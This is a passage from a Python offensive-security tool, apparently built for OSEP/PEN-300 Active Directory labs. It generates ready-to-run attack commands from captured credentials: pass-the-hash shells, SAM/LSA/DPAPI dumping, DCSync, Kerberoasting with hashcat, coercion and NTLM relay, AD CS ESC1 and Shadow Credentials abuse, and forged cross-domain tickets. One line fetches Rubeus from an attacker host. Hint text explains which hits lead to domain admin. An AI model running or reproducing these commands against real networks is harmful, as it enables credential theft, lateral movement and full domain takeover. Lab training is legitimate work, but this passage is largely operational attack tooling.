            "# swap -service-name to: defragsvc seclogon SensorDataService SessionEnv"),
    )),

    # ── HASH (Pass-the-Hash) ────────────────────────────────────────
    SuggestRule(AuthType.HASH, "smb", dc=False, commands=(
        ("list shares + perms [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} --shares"),
        ("spider shares + download readable files [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} -M spider_plus -o DOWNLOAD_FLAG=true\n"
            "# inventory + loot saved under ~/.nxc/modules/nxc_spider_plus/<ip>.json"),
        ("interactive share browse [PtH]",
            "impacket-smbclient {url_nopw} -hashes :{nthash}"),
        ("enumerate users via SAMR [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} --rid-brute"),
        ("dump SAM + LSA (needs local admin) [PtH]",
            "impacket-secretsdump {url_nopw} -hashes :{nthash}"),
        ("DPAPI secrets — browser/WiFi/saved creds (local admin) [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} --dpapi"),
        ("SYSTEM shell (needs local admin) [PtH]",
            "impacket-psexec {url_nopw} -hashes :{nthash}"),
        ("exec fallbacks [PtH]",
            "impacket-wmiexec {url_nopw} -hashes :{nthash}\n"
            "impacket-smbexec {url_nopw} -hashes :{nthash}"),
    )),
    SuggestRule(AuthType.HASH, "smb", dc=True, commands=(
        ("list shares + perms [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} --shares"),
        ("enumerate users via SAMR [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} --rid-brute"),
        ("DCSync the domain [PtH]",
            "impacket-secretsdump -just-dc {url_nopw} -hashes :{nthash}\n"
            "# on-target alt:  mimikatz \"lsadump::dcsync /domain:{dom_plain} /user:krbtgt\""),
        ("SYSTEM shell [PtH]",
            "impacket-psexec {url_nopw} -hashes :{nthash}"),
        ("GPP cpasswords in SYSVOL [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} -M gpp_password"),
    )),
    SuggestRule(AuthType.HASH, "winrm", commands=(
        ("interactive shell [PtH]",
            "evil-winrm -i {qip} -u {quser} -H {qhash}"),
        ("confirm exec without a full shell [PtH]",
            "nxc winrm {qip} -u {quser} -H {qhash} -x whoami"),
    )),
    SuggestRule(AuthType.HASH, "wmi", commands=(
        ("semi-interactive shell [PtH]",
            "impacket-wmiexec {url_nopw} -hashes :{nthash}"),
        ("exec fallback if wmiexec fails [PtH]",
            "impacket-smbexec {url_nopw} -hashes :{nthash}"),
        ("quick command exec [PtH]",
            "nxc wmi {qip} -u {quser} -H {qhash} -x whoami"),
    )),
    SuggestRule(AuthType.HASH, "rdp", commands=(
        ("RDP session [PtH]",
            "{rdp_bin} /u:{quser} /pth:{nthash} /d:{qdom} /v:{qip} "
            "/dynamic-resolution /drive:share,/home/kali /cert:ignore"),
        ("screenshot the desktop [PtH]",
            "nxc rdp {qip} -u {quser} -H {qhash} --screenshot"),
    )),
    SuggestRule(AuthType.HASH, "mssql", commands=(
        ("SQL client [PtH]",
            "impacket-mssqlclient {url_nopw} -hashes :{nthash} {mssql_authflag}"),
        ("OS command via nxc [PtH]",
            "nxc mssql {qip} -u {quser} -H {qhash} -x whoami"),
    )),
    SuggestRule(AuthType.HASH, "ldap", dc=True, commands=(
        ("Kerberoast [PtH, from Kali]",
            "impacket-GetUserSPNs -request -dc-ip {qip} -hashes :{nthash} "
            "{qdom}/{quser} -outputfile kerb.hash\n"
            "# crack:  hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt"),
        ("AS-REP roast [PtH, from Kali]",
            "impacket-GetNPUsers {qdom}/{quser} -hashes :{nthash} -request "
            "-format hashcat -outputfile asrep.hash -dc-ip {qip}\n"
            "# crack:  hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"),
        ("Kerberoast / AS-REP on the target if impacket fails (Rubeus)",
            "# upload first:  iwr http://$LHOST/Rubeus.exe -o Rubeus.exe   ($LHOST = your VPN IP)\n"
            "Rubeus.exe kerberoast /nowrap /outfile:kerb.hash\n"
            "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.hash"),
        ("BloodHound [PtH]",
            "bloodhound-python -u {quser} --hashes :{nthash} -d {qdom} "
            "-dc {fqdn} -ns {qip} -c All --zip"),
        ("BloodHound fallback (nxc collector) [PtH]",
            "nxc ldap {qip} -u {quser} -H {qhash} --bloodhound -c All "
            "--dns-server {qip}"),
        ("attack-path checks [PtH]",
            "nxc ldap {qip} -u {quser} -H {qhash} --password-not-required\n"
            "nxc ldap {qip} -u {quser} -H {qhash} --admin-count\n"
            "# (delegation runs automatically; --no-enrich to skip)"),
    )),
    SuggestRule(AuthType.HASH, "ldap", dc=False, commands=(
        ("request a TGT (then use with -k)",
            "impacket-getTGT {qdom}/{quser} -hashes :{nthash}"),
    )),

    # ── KERBEROS (ticket cache) ─────────────────────────────────────
    SuggestRule(AuthType.KERBEROS, "smb", commands=(
        ("SYSTEM shell -k",
            "impacket-psexec -k -no-pass {url_nopw}"),
    )),
    SuggestRule(AuthType.KERBEROS, "smb", dc=True, commands=(
        ("DCSync the domain -k",
            "impacket-secretsdump -just-dc -k -no-pass {url_nopw}"),
    )),
    SuggestRule(AuthType.KERBEROS, "winrm", commands=(
        ("interactive shell -r",
            "evil-winrm -i {qip} -u {quser} -r {qdom}"),
    )),
    SuggestRule(AuthType.KERBEROS, "ldap", dc=True, commands=(
        ("Kerberoast -k",
            "impacket-GetUserSPNs -k -no-pass -dc-ip {qip} {qdom}/ "
            "-request -outputfile kerb.hash\n"
            "# crack:  hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt"),
        ("Kerberoast / AS-REP on the target (Rubeus, uses current ticket)",
            "Rubeus.exe kerberoast /nowrap /outfile:kerb.hash\n"
            "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.hash"),
        ("BloodHound -k",
            "bloodhound-python -u {quser} -k -no-pass -d {qdom} "
            "-dc {fqdn} -ns {qip} -c All --zip\n"
            "# note: -no-pass is SINGLE-dash in BloodHound.py (--no-pass errors)"),
        ("BloodHound fallback (nxc collector) -k",
            "nxc ldap {qip} -u {quser} -k --bloodhound -c All "
            "--dns-server {qip}"),
    )),

    # ══ OSEP / PEN-300 lateral-movement follow-ups ═════════════════
    # The blocks above get a shell and dump the box — the foundational core.
    # The ones below are the lateral-movement continuations that an
    # enumeration hit can tee up: host posture (what AV/EDR is watching),
    # linked-server pivots, the four flavours of delegation, authentication
    # coercion for relay, AD CS (ESC1/ESC8), domain/forest trusts, and the
    # cross-domain hop. All standard nxc / impacket / certipy invocations.
    # Placeholders in <ANGLE BRACKETS> are yours to fill from the enumeration
    # output, and in --sh mode any line still holding one is emitted
    # commented-out so the script stays runnable. These recipes stop where a
    # payload or an interactive relay listener takes over — that hand-off is
    # deliberate.

    # ── Host posture: what's defending this box ─────────────────────
    SuggestRule(AuthType.PASSWORD, "smb", commands=(
        ("AV / EDR present on the host (read this BEFORE delivering anything)",
            "nxc smb {qip} -u {quser} -p {qpw} -M enum_av"),
    )),
    SuggestRule(AuthType.HASH, "smb", commands=(
        ("AV / EDR present on the host [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} -M enum_av"),
    )),

    # ── MSSQL: privileges and linked servers ────────────────────────
    # A linked server is the classic OSEP pivot: the link executes under a
    # DIFFERENT login (often sa, often on a different host), so a low-priv
    # SQL account on box A becomes command execution on box B.
    SuggestRule(AuthType.PASSWORD, "mssql", commands=(
        ("SQL privileges + impersonable logins",
            "nxc mssql {qip} -u {quser} -p {qpw} -M mssql_priv\n"
            "nxc mssql {qip} -u {quser} -p {qpw} -M enum_impersonate\n"
            "nxc mssql {qip} -u {quser} -p {qpw} -M enum_logins\n"
            "# escalate once a sysadmin impersonation path is confirmed:\n"
            "nxc mssql {qip} -u {quser} -p {qpw} -M mssql_priv -o ACTION=privesc"),
        ("linked servers — enumerate the chain",
            "nxc mssql {qip} -u {quser} -p {qpw} -M enum_links\n"
            "# or interactively:\n"
            "impacket-mssqlclient {url_pw} {mssql_authflag}\n"
            "#   enum_links          -- list links + the login each runs as\n"
            "#   use_link [SRV]      -- switch execution onto a link\n"
            "#   SELECT SYSTEM_USER; -- confirm who you became"),
        ("execute down a linked server (needs RPC Out on the link)",
            "# from the mssqlclient prompt, once a link is confirmed:\n"
            "EXEC ('SELECT @@version, SYSTEM_USER') AT [<LINKED-SRV>];\n"
            "# enable xp_cmdshell on the far end:\n"
            "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [<LINKED-SRV>];\n"
            "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [<LINKED-SRV>];\n"
            "EXEC ('xp_cmdshell ''whoami''') AT [<LINKED-SRV>];\n"
            "# chained links nest the same way:\n"
            "#   EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [<SRV2>]') AT [<SRV1>];"),
        ("same thing via nxc modules (no SQL prompt needed)",
            "nxc mssql {qip} -u {quser} -p {qpw} -M link_enable_cmdshell "
            "-o LINKED_SERVER=<SRV>\n"
            "nxc mssql {qip} -u {quser} -p {qpw} -M link_xpcmd "
            "-o LINKED_SERVER=<SRV> CMD='whoami'"),
    )),
    SuggestRule(AuthType.HASH, "mssql", commands=(
        ("SQL privileges + linked servers [PtH]",
            "nxc mssql {qip} -u {quser} -H {qhash} -M mssql_priv\n"
            "nxc mssql {qip} -u {quser} -H {qhash} -M enum_impersonate\n"
            "nxc mssql {qip} -u {quser} -H {qhash} -M enum_links"),
    )),

    # ── LDAP/DC: delegation, coercion, trusts, LAPS, ADCS ───────────
    SuggestRule(AuthType.PASSWORD, "ldap", dc=True, commands=(
        ("delegation — enumerate (run under --no-enrich; otherwise automatic)",
            "nxc ldap {qip} -u {quser} -p {qpw} --find-delegation\n"
            "impacket-findDelegation {qdom}/{quser}:{qpw} -dc-ip {qip}\n"
            "# pipe either back for the matched branch:\n"
            "#   ... --find-delegation | {tomsploit} --deleg-in - -t {qip} -d {qdom} -u {quser} -p {qpw}"),
        ("coercion — force a target to authenticate (relay / unconstrained trigger)",
            "# check which methods bite (LISTENER defaults to localhost = safe probe):\n"
            "nxc smb {qip} -u {quser} -p {qpw} -M coerce_plus\n"
            "# then fire at your listener (relay catcher or krbrelayx):\n"
            "nxc smb {qip} -u {quser} -p {qpw} -M coerce_plus -o LISTENER=$LHOST\n"
            "# NOTE an IP listener forces NTLM. For the UNCONSTRAINED TGT-capture\n"
            "# chain the coerced host must address you by a NAME with a\n"
            "# resolvable SPN, or no Kerberos AP-REQ (and no TGT) ever arrives:\n"
            "#   python3 dnstool.py -u '{dom_plain}\\{quser}' -p {qpw} \\\n"
            "#     -r <fakename>.{dom_plain} -d $LHOST -a add {ip}\n"
            "#   nxc smb {qip} -u {quser} -p {qpw} -M coerce_plus -o LISTENER=<fakename>.{dom_plain}\n"
            "# relay elsewhere (SMB signing off) or to AD CS HTTP (ESC8):\n"
            "# impacket-ntlmrelayx -t smb://<victim> -smb2support\n"
            "# impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController"),
        ("domain / forest trusts",
            "nxc ldap {qip} -u {quser} -p {qpw} --dc-list\n"
            "impacket-lookupsid {url_pw} 0\n"
            "# --dc-list lists DCs AND enumerates trustedDomain objects with\n"
            "# direction/type/attributes (the -M enum_trusts module is a removed\n"
            "# stub that just points here). lookupsid gives the domain SID a\n"
            "# cross-domain forged ticket needs."),
        ("LAPS / gMSA passwords (if this account can read them)",
            "nxc ldap {qip} -u {quser} -p {qpw} -M laps\n"
            "nxc ldap {qip} -u {quser} -p {qpw} --gmsa"),
        ("AD CS — find vulnerable templates, then request as a target",
            "nxc ldap {qip} -u {quser} -p {qpw} -M adcs\n"
            "certipy find -u {qupn} -p {qpw} -dc-ip {ip} "
            "-vulnerable -stdout\n"
            "# ESC1 (template allows SAN): request as Administrator, then PKINIT:\n"
            "certipy req -u {qupn} -p {qpw} -dc-ip {ip} \\\n"
            "  -ca <CA-NAME> -template <TEMPLATE> -upn {qupn_admin} \\\n"
            "  -sid <DOMAIN-SID>-500\n"
            "# ^ -sid is REQUIRED on anything patched for KB5014754 (strong\n"
            "#   certificate mapping); the domain SID comes from the lookupsid\n"
            "#   line in the trusts block above.\n"
            "certipy auth -pfx administrator.pfx -dc-ip {ip}\n"
            "# ^ returns the NT hash (UnPAC-the-hash) + a usable TGT"),
        ("certipy — always run find first; Shadow Credentials if you can write a target",
            "# 1. discover ADCS + every ESC in one shot (run even if -M adcs was quiet):\n"
            "certipy find -u {qupn} -p {qpw} -dc-ip {ip} -vulnerable -stdout\n"
            "# 2. Shadow Credentials — GenericWrite/GenericAll over ANY target (user\n"
            "#    or computer) = takeover WITHOUT its password. certipy writes a key\n"
            "#    to msDS-KeyCredentialLink, PKINITs, returns the hash:\n"
            "certipy shadow auto -u {qupn} -p {qpw} -dc-ip {ip} -account <TARGET>\n"
            "# ^ cleaner than RBCD: no MAQ, no new computer account."),
    )),
    SuggestRule(AuthType.HASH, "ldap", dc=True, commands=(
        ("delegation — enumerate (automatic unless --no-enrich) [PtH]",
            "nxc ldap {qip} -u {quser} -H {qhash} --find-delegation\n"
            "impacket-findDelegation {qdom}/{quser} -hashes :{nthash} -dc-ip {qip}\n"
            "#   ... | {tomsploit} --deleg-in - -t {qip} -d {qdom} -u {quser} -H {qhash}"),
        ("coercion — force auth for relay / unconstrained [PtH]",
            "nxc smb {qip} -u {quser} -H {qhash} -M coerce_plus\n"
            "nxc smb {qip} -u {quser} -H {qhash} -M coerce_plus -o LISTENER=$LHOST"),
        ("domain / forest trusts [PtH]",
            "nxc ldap {qip} -u {quser} -H {qhash} --dc-list\n"
            "impacket-lookupsid {url_nopw} -hashes :{nthash} 0\n"
            "# --dc-list covers DCs + trusts in current NetExec"),
        ("LAPS / gMSA passwords [PtH]",
            "nxc ldap {qip} -u {quser} -H {qhash} -M laps\n"
            "nxc ldap {qip} -u {quser} -H {qhash} --gmsa"),
        ("AD CS — find vulnerable templates [PtH]",
            "nxc ldap {qip} -u {quser} -H {qhash} -M adcs\n"
            "certipy find -u {qupn} -hashes :{nthash} -dc-ip {ip} "
            "-vulnerable -stdout\n"
            "certipy req -u {qupn} -hashes :{nthash} -dc-ip {ip} \\\n"
            "  -ca <CA-NAME> -template <TEMPLATE> -upn {qupn_admin} \\\n"
            "  -sid <DOMAIN-SID>-500\n"
            "# ^ -sid required post-KB5014754 (strong certificate mapping)\n"
            "certipy auth -pfx administrator.pfx -dc-ip {ip}"),
        ("certipy — always run find first; Shadow Credentials if you can write a target [PtH]",
            "certipy find -u {qupn} -hashes :{nthash} -dc-ip {ip} -vulnerable -stdout\n"
            "# Shadow Credentials over a writable target (no MAQ, no new computer):\n"
            "certipy shadow auto -u {qupn} -hashes :{nthash} -dc-ip {ip} -account <TARGET>"),
    )),

    # ── After DCSync: the cross-domain continuation ─────────────────
    # DCSync gets you one domain. In a multi-domain forest the krbtgt hash of
    # a CHILD domain forges a ticket into the PARENT via the SID-history
    # field (Enterprise Admins, -519) — the forest-level escalation PEN-300
    # builds toward. This fires only on a confirmed DC admin, since you need
    # krbtgt in hand for it to mean anything.
    SuggestRule(AuthType.PASSWORD, "smb", dc=True, admin=True, commands=(
        ("child → parent escalation (after you have krbtgt)",
            "# 1. child domain SID:\n"
            "impacket-lookupsid {url_pw} 0\n"
            "# 2. parent domain SID (same command against the parent DC), then\n"
            "#    forge with Enterprise Admins (-519) from the PARENT:\n"
            "impacket-ticketer -nthash <KRBTGT-NT-HASH> -domain-sid <CHILD-SID> \\\n"
            "  -domain {dom_plain} -extra-sid <PARENT-SID>-519 Administrator\n"
            "export KRB5CCNAME=Administrator.ccache\n"
            "impacket-psexec -k -no-pass <parent-dc.fqdn>\n"
            "# nxc automates the same chain:\n"
            "#   nxc ldap {qip} -u {quser} -p {qpw} -M raisechild"),
    )),
]


def build_context(s: Success, ip: str, hostname: str, is_dc: bool,
                  domain_fallback: str = "") -> dict[str, str]:
    """Pre-quote every value a template might substitute. Raw `ip` is the
    only un-quoted entry and is only used inside //ip/ and ip:export paths
    (an IP/hostname is shell-safe)."""
    user = s.user or ""
    domain = s.domain or domain_fallback or ""
    secret = s.secret or ""
    pth_hash = secret if s.is_hash else ""   # PtH templates only fire for HASH
    # secretsdump prints hashes as LMHASH:NTHASH. impacket -hashes wants the NT
    # half (':{nthash}'), so collapse a full pair down to the NT hash; an
    # NT-only hash passes through unchanged.
    nt_only = pth_hash
    if pth_hash and ":" in pth_hash:
        parts = pth_hash.split(":")
        if len(parts) == 2 and all(re.fullmatch(r"[0-9a-fA-F]{32}", p) for p in parts):
            nt_only = parts[1]

    if domain:
        url_pw = f"{domain}/{user}:{secret}@{ip}"
        url_nopw = f"{domain}/{user}@{ip}"
    else:
        url_pw = f"{user}:{secret}@{ip}"
        url_nopw = f"{user}@{ip}"

    if domain and not s.is_hash:
        smb_user = f"{domain}\\{user}%{secret}"
    elif not s.is_hash:
        smb_user = f"{user}%{secret}"
    else:
        smb_user = f"{domain}\\{user}" if domain else user

    ldap_user = (domain + "\\" + user) if domain else user

    return {
        "ip": ip,
        "qip": q(ip),
        "quser": q(user),
        "qpw": q(secret) if not s.is_hash else "''",
        "qdom": q(domain) if domain else "''",
        "qhash": q(pth_hash) if pth_hash else "''",
        "nthash": q(nt_only) if nt_only else "NT",
        "url_pw": q(url_pw),
        "url_nopw": q(url_nopw),
        "host": q(hostname or ip),
        "fqdn": q(f"{hostname}.{domain}" if hostname and domain else (hostname or ip)),
        "smb_user": q(smb_user),
        "ldap_user": q(ldap_user),
        "user_ssh": q(f"{user}@{ip}"),
        "user_at_host": q(f"{user}:{secret}@{ip}" if secret else f"{user}@{ip}"),
        "ftp_url": q(f"ftp://{user}:{secret}@{ip}/"),
        "dom_plain": domain or "<DOMAIN>",
        # Shell-quoted user@domain, for tools that take a UPN as one argument
        # (certipy -u). {quser}@{dom_plain} left the domain UNQUOTED, so a
        # domain with a shell metacharacter (from a rogue host's nxc output)
        # broke the command; this quotes the whole token safely.
        "qupn": q(f"{user}@{domain}" if domain else user),
        "qupn_admin": q(f"administrator@{domain}" if domain else "administrator"),
        "mssql_authflag": "" if s.local_auth else "-windows-auth",
        # Kali 2024+ ships xfreerdp3; older images only have xfreerdp. Pick
        # whichever is actually on PATH so a pasted command doesn't die with
        # "command not found" at the worst possible moment.
        "rdp_bin": rdp_binary(),
        # How to re-invoke this script for --deleg-in. Uses the path actually
        # used to start it, so a symlink on PATH, ./tomsploit.py and
        # `python3 tomsploit.py` all produce a command that really runs.
        "tomsploit": tomsploit_invocation(),
    }


def tomsploit_invocation() -> str:
    """The command that re-runs this script. argv[0] as given if it is on
    PATH or executable, else an explicit `python3 <path>` so the emitted
    pipe-back line is copy-pasteable rather than aspirational."""
    global _SELF_CMD
    if _SELF_CMD is None:
        argv0 = sys.argv[0] or "tomsploit"
        base = os.path.basename(argv0)
        if shutil.which(base):
            _SELF_CMD = base
        elif os.path.isfile(argv0) and os.access(argv0, os.X_OK):
            _SELF_CMD = argv0 if os.path.sep in argv0 else f"./{argv0}"
        elif os.path.isfile(argv0):
            _SELF_CMD = f"python3 {shlex.quote(argv0)}"
        else:
            _SELF_CMD = "tomsploit"
    return _SELF_CMD


_SELF_CMD: str | None = None


def rdp_binary() -> str:
    """Name of the FreeRDP client present on this box (cached)."""
    global _RDP_BIN
    if _RDP_BIN is None:
        _RDP_BIN = ("xfreerdp3" if shutil.which("xfreerdp3")
                    else "xfreerdp" if shutil.which("xfreerdp")
                    else "xfreerdp3")
    return _RDP_BIN


_RDP_BIN: str | None = None


def _inject_local_auth(cmd: str) -> str:
    """A local (non-domain) credential needs --local-auth on every nxc
    command, or nxc attempts DOMAIN auth against the machine name and fails.
    impacket commands handle local auth via the machine-name 'domain', so we
    only touch nxc lines. Idempotent; leaves '#' note lines untouched."""
    lines = cmd.split("\n")
    for i, ln in enumerate(lines):
        if ln.strip().startswith("nxc ") and "--local-auth" not in ln:
            lines[i] = ln.rstrip() + " --local-auth"
    return "\n".join(lines)


# ─── Outcome hints ──────────────────────────────────────────────────────
# One line per command, keyed by its label. These deliberately do NOT
# describe the command — the invocation already does that, and a line that
# restates the binary name is pure height. They say what a HIT looks like
# and where it leads, which is the part you cannot read off the command.
#
# A command with nothing useful to say gets no entry and prints bare. That
# is the point: padding every line to be consistent is how the output got
# loud in the first place.
#
# Keys must match SUGGEST_RULES labels exactly; _check_hint_labels() is
# asserted in the test path so a renamed label cannot silently orphan a hint.

_HINTS: dict[str, str] = {
    # ── SMB ──
    "list shares + perms":
        "WRITE anywhere → plant .scf/.url for NetNTLM; READ on SYSVOL → chase GPP",
    "spider shares + download readable files":
        "grep the loot for 'password', .kdbx, .ps1, web.config, unattend.xml",
    "enumerate users via SAMR (RID brute)":
        "this is your users.txt for spraying, roasting and kerbrute",
    "password policy (avoid lockout)":
        "read the threshold BEFORE any spray; 0 = no lockout, spray freely",
    "GPP cpasswords in SYSVOL":
        "a cpassword is AES-decryptable with a public key = instant local admin",
    "DCSync the domain":
        "needs DA or DS-Replication rights; krbtgt hash = golden tickets",
    "dump SAM + LSA + cached creds (needs local admin)":
        "LSA secrets often hold a service account password in cleartext",
    "DPAPI secrets — browser creds, WiFi keys, saved RDP/creds (local admin)":
        "saved creds a user actually typed — browsers, RDP, WiFi; often the fastest win",
    "exec fallback if wmiexec fails [PtH]":
        "smbexec needs only 445; wmiexec needs 135+445",
    "SYSTEM shell (needs local admin)":
        "drops a service binary — noisy; wmiexec/smbexec are quieter",
    "exec fallbacks (if psexec fails)":
        "wmiexec needs 135+445, smbexec needs 445 only",
    "AV / EDR present on the host (read this BEFORE delivering anything)":
        "decides whether TomCrypt output needs AMSI/AppLocker handling at all",
    "browse SYSVOL / scripts":
        "logon scripts leak mapped drives, service accounts and hardcoded creds",

    # ── LDAP / DC ──
    "clock skew — do this FIRST, it breaks every Kerberos step below":
        "KRB_AP_ERR_SKEW is why a valid ticket 'doesn't work'",
    "Kerberoast — SPN tickets (from Kali)":
        "crack -m 13100; service accounts are reused as local admin constantly",
    "AS-REP roast — preauth-disabled users (from Kali)":
        "crack -m 18200; works with no creds at all if you have usernames",
    "BloodHound (primary collector)":
        "run Shortest Path to Domain Admins, then mark everything you own",
    "attack-path checks":
        "password-not-required = free auth; adminCount=1 = privileged, roast it",
    "offline AD dump (no BloodHound)":
        "grep the users HTML for passwords in description fields",
    "enumerate more usernames (kerbrute)":
        "AS-REQ probing does not count toward lockout",
    "coercion — force a target to authenticate (relay / unconstrained trigger)":
        "any method that bites = a relay target or an unconstrained TGT capture",
    "domain / forest trusts":
        "Inbound/Bidirectional trust = a path INTO the other domain",
    "LAPS / gMSA passwords (if this account can read them)":
        "LAPS gives local admin on that one host; gMSA is often a service identity",
    "AD CS — find vulnerable templates, then request as a target":
        "ESC1 = any template with SAN + client auth = DA cert",
    "certipy — always run find first; Shadow Credentials if you can write a target":
        "find shows every ESC; shadow = takeover via key write, no password needed",
    "delegation — enumerate (run under --no-enrich; otherwise automatic)":
        "an SPN pointing at the DC is domain compromise, not a lateral move",

    # ── other protocols ──
    "interactive shell":
        "needs Remote Management Users membership, not just valid creds",
    "semi-interactive shell":
        "no service created, so quieter than psexec",
    "RDP session (+ share mount for transfers)":
        "/drive: gives you file transfer without touching SMB",
    "screenshot the desktop":
        "shows a logged-in session without authenticating interactively",
    "SQL privileges + impersonable logins":
        "an impersonable sysadmin login = xp_cmdshell as SYSTEM",
    "linked servers — enumerate the chain":
        "links execute as a DIFFERENT login, often sa on another host",
    "capture NetNTLM via xp_dirtree (start responder first)":
        "gives you the SQL service account hash — crack or relay it",
    "shell (no host-key prompts)":
        "check sudo -l and id first; GTFOBins the rest",

    # ── after DCSync ──
    "child → parent escalation (after you have krbtgt)":
        "SID history is not filtered within a forest — this is the forest win",

    # ── previously uncovered (parity pass) ──
    "interactive share browse":
        "manual poke when spider_plus is overkill — one share, eyes on",
    "full SMB/RPC enum":
        "users, groups, shares, password policy in one shot",
    "AS-REP roast — on the target (Rubeus)":
        "when you have a Windows foothold but no route out to Kali",
    "Kerberoast — on the target if impacket fails (Rubeus)":
        "same tickets, collected host-side — crack -m 13100 back on Kali",
    "BloodHound fallback (nxc collector)":
        "use when bloodhound-python can't reach the DC; same graph data",
    "SQL client":
        "impersonable sysadmin login = xp_cmdshell as SYSTEM",
    "xp_cmdshell (in the mssqlclient prompt)":
        "enable + run OS commands as the SQL service account",
    "OS command via nxc":
        "one-shot command without holding the SQL prompt open",
    "linked servers — enumerate the chain":
        "links execute as a DIFFERENT login, often sa on another host",
    "execute down a linked server (needs RPC Out on the link)":
        "pivots SQL exec to the linked host — check RPC Out is enabled",
    "same thing via nxc modules (no SQL prompt needed)":
        "mssql_priv / link enumeration without dropping into a prompt",
    "confirm exec without a full shell":
        "proves the creds run commands before you commit to a shell",
    "quick command exec":
        "one command, no session — quiet reconnaissance",
    "after login — quick local enum":
        "sudo -l, id, SUID — the first three things on any *nix box",
    "offline directory dump":
        "grep the users HTML for passwords in description fields",
    "shell via the ticket cache (GSSAPI)":
        "reuse an existing ccache — no password/hash needed",
    "recursive pull":
        "mirror a whole share locally, then grep the loot at leisure",
    "log in with the found creds":
        "check for uploads, config backups, and web-root write access",
    "connect":
        "interactive session on the share",
    "list exports":
        "NFS shares often world-readable — check for home dirs and keys",
    "mount an export":
        "no_root_squash = write a SUID binary as root for local privesc",
    "_scshell":
        "patches a service binary in place — no new service, quieter",
    "request a TGT (then use with -k)":
        "gets a ccache you reuse across impacket tools with -k -no-pass",
}


# PtH rules label the SAME command slightly differently ("... [PtH]", and a
# few are shortened). A hint describes what the COMMAND does, which is
# identical either way, so hints are looked up on a NORMALISED label rather
# than duplicated per auth type. _norm_label folds both forms to one key.
import re as _re_hints
_PTH_SUFFIX = _re_hints.compile(r"\s*\[PtH[^\]]*\]\s*$")
# -k (kerberos ccache) and -r (kcache) auth variants suffix the label the same
# way [PtH] does; fold them too so one hint covers all auth forms of a command.
_KAUTH_SUFFIX = _re_hints.compile(r"\s+-[kr]\s*$")

# Wording that differs between the password and PtH label for the same command.
# Map the SHORTER/variant form onto the canonical (password) label text.
_LABEL_ALIASES = {
    "enumerate users via SAMR": "enumerate users via SAMR (RID brute)",
    "dump SAM + LSA (needs local admin)":
        "dump SAM + LSA + cached creds (needs local admin)",
    "DPAPI secrets — browser/WiFi/saved creds (local admin)":
        "DPAPI secrets — browser creds, WiFi keys, saved RDP/creds (local admin)",
    "dump SAM + LSA": "dump SAM + LSA + cached creds (needs local admin)",
    "SYSTEM shell": "SYSTEM shell (needs local admin)",
    "exec fallbacks": "exec fallbacks (if psexec fails)",
    "AV / EDR present on the host":
        "AV / EDR present on the host (read this BEFORE delivering anything)",
    "Kerberoast": "Kerberoast — SPN tickets (from Kali)",
    "Kerberoast [from Kali]": "Kerberoast — SPN tickets (from Kali)",
    "AS-REP roast": "AS-REP roast — preauth-disabled users (from Kali)",
    "AS-REP roast [from Kali]": "AS-REP roast — preauth-disabled users (from Kali)",
    "BloodHound": "BloodHound (primary collector)",
    "RDP session": "RDP session (+ share mount for transfers)",
    "SQL privileges + linked servers": "SQL privileges + impersonable logins",
    # these two PtH labels shorten the password label; map to the real text
    "SQL client": "SQL client",
    "OS command via nxc": "OS command via nxc",
    # Kerberos-auth Rubeus variant folds onto the on-target roast hint
    "Kerberoast / AS-REP on the target if impacket fails (Rubeus)":
        "Kerberoast — on the target if impacket fails (Rubeus)",
    "Kerberoast / AS-REP on the target (Rubeus, uses current ticket)":
        "Kerberoast — on the target if impacket fails (Rubeus)",
    "Kerberoast": "Kerberoast — SPN tickets (from Kali)",
    "interactive shell": "shell (no host-key prompts)",
    "lateral movement via SCShell — use when psexec/smbexec fail":
        "_scshell",
    "lateral movement via SCShell [PtH] — use when psexec/smbexec fail":
        "_scshell",
    "lateral movement via SCShell -k — use when psexec fails":
        "_scshell",
}


def _norm_label(label: str) -> str:
    """Canonical hint key for a label: drop the [PtH...] / -k / -r auth suffix,
    then fold any known wording variant onto its password-label equivalent."""
    base = _PTH_SUFFIX.sub("", label)
    base = _KAUTH_SUFFIX.sub("", base).strip()
    return _LABEL_ALIASES.get(base, base)


def _hint_for(label: str) -> str:
    return _HINTS.get(label, "") or _HINTS.get(_norm_label(label), "")


def _check_hint_labels() -> list[str]:
    """Hint keys that no longer match any SUGGEST_RULES label (i.e. orphaned
    by a rename). Asserted in tests so drift is caught, not silently ignored."""
    labels = {_norm_label(l) for r in SUGGEST_RULES for l, *_ in r.commands}
    labels |= {l for r in SUGGEST_RULES for l, *_ in r.commands}
    return [k for k in _HINTS if k not in labels]


def _labels_without_hints() -> list[str]:
    """The REVERSE check: emitted command labels that resolve NO hint. This is
    the gap that let PtH output lose all its hints silently — every hint key
    matched a password label, but the parallel PtH labels matched nothing and
    _check_hint_labels only looked one way. Asserted in tests so a new command
    (or a new [PtH] variant) can't ship hintless without being noticed.

    Only 'real' suggestion commands count — the delegation blocks carry their
    own GET/REQUIRED/MISSING structure instead of a one-line hint, and a few
    labels are intentionally hint-free, listed below."""
    intentionally_bare = {
        # These carry their own GET/REQUIRED/MISSING structure (delegation) or
        # are gated enrichment blocks — a one-line hint would be redundant.
        "delegation — enumerate (automatic unless --no-enrich)",
        "delegation — enumerate (automatic unless --no-enrich) [PtH]",
        "coercion — force a target to authenticate (relay / unconstrained trigger)",
        "coercion — force auth for relay / unconstrained [PtH]",
        "LAPS / gMSA passwords (if this account can read them)",
        "LAPS / gMSA passwords [PtH]",
        "AD CS — find vulnerable templates, then request as a target",
        "AD CS — find vulnerable templates [PtH]",
    }
    intentionally_bare = {_norm_label(x) for x in intentionally_bare} | intentionally_bare
    missing = []
    seen = set()
    for r in SUGGEST_RULES:
